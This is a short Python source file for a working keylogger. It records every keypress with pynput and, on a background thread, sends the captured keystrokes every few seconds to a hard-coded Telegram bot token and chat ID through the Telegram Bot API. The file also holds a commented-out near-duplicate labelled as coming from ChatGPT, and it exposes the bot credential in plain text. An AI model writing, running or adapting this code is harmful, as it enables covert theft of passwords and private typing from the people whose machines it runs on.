""" 
https://api.telegram.org/bot5818555834:AAF61oPhhWUcmdNtW72mqIk3_vqgvpg2Kp4/sendMessage?chat_id=921245059&text=hacked
token (k3tonbot) = 5818555834:AAF61oPhhWUcmdNtW72mqIk3_vqgvpg2Kp4
chat_id = 921245059
"""
from pynput import keyboard
import time, threading, requests


data = ''
def log(key): #capture the keys and append it into data
    global data
    data = data + '['+str(key)+']'

def send_log(): 
#we need to run this func also at the same time with log, so need to use multithreading.
# what this func do is wait for 10 sec and send whatever in data is and then empty the data again
    while True:
        global data
        time.sleep(5)
        if data != '':
            url = f"https://api.telegram.org/bot5818555834:AAF61oPhhWUcmdNtW72mqIk3_vqgvpg2Kp4/sendMessage?chat_id=921245059&text={data}"
            requests.get(url)
        data = ''

key_thread = threading.Thread(target=send_log)
key_thread.start()
listner = keyboard.Listener(on_press=log)
with listner:
    listner.join()


# -------------------------------------------------------------------------------
# From chatGPT

# from pynput import keyboard
# import time
# import threading
# import requests

# data = ''

# def log(key):
#     global data
#     data = data + '[' + str(key) + ']'

# def send_log():
#     while True:
#         global data
#         time.sleep(10)  # Change this to your preferred interval (in seconds)
#         if data != '':
#             # Modify this URL to use your Telegram bot token and chat ID
#             url = f"https://api.telegram.org/bot5818555834:AAF61oPhhWUcmdNtW72mqIk3_vqgvpg2Kp4/sendMessage?chat_id=921245059&text={data}"
#             requests.get(url)
#         data = ''

# if __name__ == "__main__":
#     key_thread = threading.Thread(target=send_log)
#     key_thread.start()
#     listener = keyboard.Listener(on_press=log)
#     listener.start()
#     listener.join()
